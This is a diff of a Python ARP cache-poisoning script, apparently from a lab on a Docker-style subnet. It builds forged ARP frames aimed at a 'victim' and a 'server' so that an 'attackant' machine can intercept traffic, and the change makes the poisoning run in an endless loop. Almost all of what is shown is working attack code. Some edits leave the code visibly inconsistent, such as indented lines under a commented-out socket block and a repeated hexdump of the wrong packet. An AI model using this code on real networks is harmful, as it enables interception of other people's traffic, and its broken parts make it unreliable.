@@ -147,9 +147,11 @@ def poison_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
                              payload=arp_poi_ser,
                              t=b'\x08\x06')             # ARP TYpe
     
-    with socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM) as rs:
+
+    """
+    #with socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM) as rs:
         rs.bind(('eth0',8000))
-        sentbytes = rs.sendall(arp_poi_vic)
+        sentbytes = rs.send(arp_poi_vic)
         print("Sent packet of length %d bytes" % sentbytes)
         sentbytes = rs.send(eth_poi_ser)
         print("Sent packet of length %d bytes" % sentbytes)
@@ -158,12 +160,12 @@ def poison_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
     #with socket.socket(socket.AF_INET, socket.SOCK_DGRAM,proto=) as sk:
         sk.connect((des_ip, 4000))
         sk.sendall(arp_poi_vic)
-        show_packet(arp_poi_vic)
+        scapy.hexdump(arp_poi_vic)
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sk:
         sk.connect((sou_ip, 4000))
         sk.sendall(eth_poi_ser)
-        show_packet(eth_poi_ser)
-    """
+        scapy.hexdump(arp_poi_vic)
+    
 
 def amend_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
                  sou_mac: str, sou_ip: str,   # server MAC & IP
@@ -197,7 +199,7 @@ def amend_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
 
 
 hostname = socket.gethostname()
-att_hex = hex(uuid.getnode())                  # Attackant
+att_hex = hex(uuid.getnode())                      # Attackant
 att_aux=''
 for n in range(2,len(att_hex), 2):
     att_aux = att_aux + att_hex[n: n+2] +':'
@@ -210,8 +212,8 @@ sou_mac = "02:42:c0:a8:2a:02"             # server
 des_ip = "192.168.42.3"                   # victim
 des_mac = "02:42:c0:a8:2a:03"             # victim
 
-
-poison_tables(att_mac=att_mac, att_ip=att_ip,        # Attackant MAC & IP
+while True:
+    poison_tables(att_mac=att_mac, att_ip=att_ip,        # Attackant MAC & IP
               sou_mac=sou_mac, sou_ip=sou_ip,        # server MAC & IP
               des_mac=des_mac, des_ip=des_ip)        # vistim MAC & IP
 
